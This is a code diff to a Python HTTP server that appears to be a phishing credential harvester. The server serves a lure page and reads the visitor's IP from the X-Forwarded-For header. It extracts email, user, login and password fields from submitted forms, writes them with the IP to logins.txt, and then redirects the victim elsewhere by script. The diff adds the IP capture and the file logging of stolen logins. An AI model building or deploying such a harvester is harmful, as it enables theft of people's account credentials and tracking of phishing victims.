@@ -3,12 +3,13 @@ from colorama import Fore, Style
 from io import BytesIO
 import urllib.request
 import logging
+import time
 import re
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     
     ips = []
-    
+
     def run():
         #Here is where the server runs
         running = False
@@ -24,6 +25,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         readfile = file.readlines()
         for lines in readfile:
             self.wfile.write(lines.encode())
+        self.get_ip()
+        print(Fore.RED+'[+]IP Found:',self.ips[-1])
+        print(Style.RESET_ALL)
 
     def do_POST(self):  #Request via POST
         content_length = int(self.headers['Content-Length'])
@@ -35,6 +39,14 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         values = response.getvalue()
         self.getCredentials(values)
 
+    def get_ip(self):
+        log = str(self.headers).split('\n')
+        for lines in log:
+            if re.search('^'+'X-Forwarded-For',lines):
+                address = lines.split('X-Forwarded-For: ')
+                self.ips.append(address[1])
+        
+
     def log_message(self, format, *args):
         logging.error(self.headers)
 
@@ -44,43 +56,35 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         readpost = post.strip('&')
         forms = ['email','user','login','pass'] #Possibles forms to get the credentials
         
-        try:
-            readpost = readpost.split('&')
-            count = 0
-            possibles = []
-            file = open('logins.txt','a+')
-            for line in readpost:
-                for c in forms:
-                    if c in line and re.search("^"+str(c),line) and len(line) > 0:
-                        possibles.append(line)
-                        count +=1
-                        if count >= 2:
-                            print('\n' + Fore.RED + "=" * 15 + " Possible Credentials " + "=" * 15)
-                            print('[+].::',possibles)
-                            print("=" * 52 + "\n")
-                            print(Style.RESET_ALL)
-                            count = 0
-                            possibles = []
-                            try:
-                                self.do_GET(self.redirect())
-                            except BrokenPipeError:
-                                pass
-            file.close()
-
-        except TypeError:
-            pass
+        readpost = readpost.split('&')
+        count = 0
+        possibles = []
+        file = open('logins.txt','a+')
+        for line in readpost:
+            for c in forms:
+                if c in line and re.search("^"+str(c),line) and len(line) > 0:
+                    possibles.append(line)
+                    count +=1
+                    if count >= 2:
+                        print('\n' + Fore.RED + "=" * 15 + " Possible Credentials " + "=" * 15)
+                        print('[+].::',possibles)
+                        print("=" * 52 + "\n")
+                        print(Style.RESET_ALL)
+                        file.write('IP: '+self.ips[-1]+'\n'+'    '.join(possibles)+'\n')
+                        count = 0
+                        possibles = []
+        file.close()
+        print("[!] Redirecting...")
+        self.redirect()
 
     def redirect(self):
-        url = open('site/redirect.txt','r')
-        url = url.readlines()
-        redir = '''<script>window.location.href=\"%s\"</script>''' % (url[0])
-        file = open('site/redirect.html','w')
-        file.write(redir)
-        file.close()
-        file = open('site/redirect.html', 'r')
-        readfile = file.readlines()
-        for lines in readfile:
-            self.wfile.write(lines.encode())
+        urlf = open('site/redirect.txt','r')
+        url = urlf.readlines()
+       
+        response = BytesIO()
+        redir = "<script>window.location.href=\"%s\"</script>" % (url[0])
+        self.wfile.write(redir.encode())
+        print('[+] Done!')
 
 if not __name__ == '__main__':
     SimpleHTTPRequestHandler.run()
